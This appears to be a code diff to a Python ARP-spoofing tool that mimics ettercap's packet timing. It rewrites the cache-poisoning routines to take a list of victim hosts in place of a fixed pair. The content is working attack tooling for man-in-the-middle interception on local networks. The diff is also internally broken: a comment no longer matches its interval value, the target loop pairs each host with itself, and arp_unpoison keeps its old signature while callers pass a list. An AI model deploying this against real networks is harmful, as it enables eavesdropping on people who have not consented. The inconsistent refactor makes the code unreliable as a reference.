@@ -10,7 +10,7 @@ MIDDLE_COUNT = 200 #sys.maxint # ettercap keeps poisoning for 200 packets
 END_COUNT = 3 # ettercap ends poisoning with 3 packets
 
 START_INTERVAL = 1 # ettercap sends packets every second
-MIDDLE_INTERVAL = 10 # ettercap sends packets every 10 seconds
+MIDDLE_INTERVAL = 20 # ettercap sends packets every 10 seconds
 END_INTERVAL = 1 # ettercap sends packets every second
 
 ONE_WAY_TOKEN = "ONE_WAY_TOKEN_abfjdfsldf"
@@ -50,49 +50,71 @@ def arp(gratuitious, verbose):
     second_target = spoof.validate_ip(active_hosts, first_target["ip"], previous_tuples)
 
     my_details = sh.get_my_details(iface)
-    arp_spoofing(first_target["mac"], first_target["ip"], second_target["mac"], second_target["ip"], my_details["mac"], my_details["ip"], iface, gratuitious)
+    targets = [(first_target["mac"], first_target["ip"]), (second_target["mac"], second_target["ip"])]
+    arp_spoofing(targets, my_details["mac"], my_details["ip"], iface, gratuitious)
 
-def arp_spoofing(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, gratuitious):
+def arp_spoofing(targets, macAtk, ipAtk, iface, gratuitious):
     spoof.clear()
-    spoof.printf("Spoofing the connection between " + ipT1 + " and " + ipT2, 0)
+    spoof.printf("Spoofing the connection between", 0)
+
+    to_print = "\t"
+    for i in range(len(targets)):
+        if i == len(targets) - 1:
+            to_print += targets[i][1]
+        elif i == len(targets) - 2:
+            to_print += targets[i][1] + " and "
+        else:
+            to_print += targets[i][1] + ", "
+    spoof.printf(to_print)
+
     spoof.printf("")
 
     spoof.printf("Starting poisoning... (Use Ctrl+Z to stop and kill the program)", 4)
-    poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 1)
+    poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, targets, macAtk, ipAtk, iface, 1)
 
     spoof.printf("Poisoning initiated.", 4)
-    poison_m_times_every_n_secs(MIDDLE_COUNT, MIDDLE_INTERVAL, time.time(), True, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 2, gratuitious)
+    poison_m_times_every_n_secs(MIDDLE_COUNT, MIDDLE_INTERVAL, time.time(), True, targets, macAtk, ipAtk, iface, 2, gratuitious)
 
     spoof.printf("Stopping poisoning!!! (Do not kill the program)", 4)
-    poison_m_times_every_n_secs(END_COUNT, END_INTERVAL, time.time() - END_INTERVAL, False, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, 2)
+    poison_m_times_every_n_secs(END_COUNT, END_INTERVAL, time.time() - END_INTERVAL, False, targets, macAtk, ipAtk, iface, 2)
 
 
 def one_way_arp_start(macT1, ipT1, ipT2, macAtk, ipAtk, iface):
-    poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, macT1, ipT1, ONE_WAY_TOKEN, ipT2, macAtk, ipAtk, iface, 1)
+    targets = [(macT1, ipT1), (ONE_WAY_TOKEN, ipT2)]
+    poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, targets, macAtk, ipAtk, iface, 1)
 
 def one_way_arp(macT1, ipT1, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious):
-    arp_poison(macT1, ipT1, ONE_WAY_TOKEN, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious)
+    targets = [(macT1, ipT1), (ONE_WAY_TOKEN, ipT2)]
+    arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious)
 
 def one_way_arp_end(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface):
-    poison_m_times_every_n_secs(END_COUNT, END_INTERVAL, time.time() - END_INTERVAL, False, macT1, ipT1, macT2, ipT2, ONE_WAY_TOKEN, ipAtk, iface, 2)
+    targets = [(macT1, ipT1), (macT2, ipT2)]
+    poison_m_times_every_n_secs(END_COUNT, END_INTERVAL, time.time() - END_INTERVAL, False, targets, ONE_WAY_TOKEN, ipAtk, iface, 2)
 
-def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious=False):
+def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, targets, macAtk, ipAtk, iface, pkt_type, gratuitious=False):
     while m > 0:
         if time.time() - last_sent_time > n:
             if should_poison:
-                arp_poison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious)
+                arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious)
             else:
-                arp_unpoison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type)     
+                arp_unpoison(targets, macAtk, ipAtk, iface, pkt_type)     
             last_sent_time = time.time()
             m -= 1
     
-def arp_poison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type, gratuitious):
-    if macT2 == ONE_WAY_TOKEN:
-        send_one_directional(macT1, ipT1, ipT2, macAtk, iface, pkt_type, gratuitious)
-    elif macT1 == ONE_WAY_TOKEN:
-        send_one_directional(macT2, ipT2, ipT1, macAtk, iface, pkt_type, gratuitious)
-    else:
-        send_bi_directional(ipT2, macT2, ipT1, macT1, macAtk, macAtk, iface, pkt_type, gratuitious)
+def arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious):
+    for i in range(len(targets)):
+        for j in range(i,len(targets)):
+            macT1 = targets[i][0]
+            ipT1  = targets[i][1]            
+            macT2 = targets[j][0]
+            ipT2  = targets[j][1]
+
+            if macT2 == ONE_WAY_TOKEN:
+                send_one_directional(macT1, ipT1, ipT2, macAtk, iface, pkt_type, gratuitious)
+            elif macT1 == ONE_WAY_TOKEN:
+                send_one_directional(macT2, ipT2, ipT1, macAtk, iface, pkt_type, gratuitious)
+            else:
+                send_bi_directional(ipT2, macT2, ipT1, macT1, macAtk, macAtk, iface, pkt_type, gratuitious)
 
 def arp_unpoison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type):
     gratuitious = False
